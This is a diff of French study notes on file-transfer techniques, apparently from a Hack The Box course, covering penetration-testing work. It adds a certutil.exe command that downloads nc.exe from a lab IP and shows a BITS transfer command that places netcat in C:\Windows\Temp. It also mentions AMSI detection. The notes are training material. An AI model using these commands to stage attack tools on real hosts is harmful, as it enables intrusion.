@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T15:53:12.759Z
+date: 2025-05-04T15:55:29.001Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -946,5 +946,15 @@ Télécharger un fichier avec le module `bitstransfer` et la cmdlet `Start-BitsT
 mport-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
 ```
 
+Casey Smith (@subTee) a découvert que Certutil peut être utilisé pour télécharger des fichiers.
+Disponible dans toutes les versions de Windows, il est devenu un outil populaire de transfert de fichiers, agissant comme un `wget` pour Windows.
+Cependant, [l'interface de scan antimalware (AMSI)](https://learn.microsoft.com/fr-fr/windows/win32/amsi/antimalware-scan-interface-portal) détecte actuellement cette utilisation de Certutil comme malveillante.
 
 
+Télécharger un fichier avec `certutil.exe`:
+
+```
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+## Detection
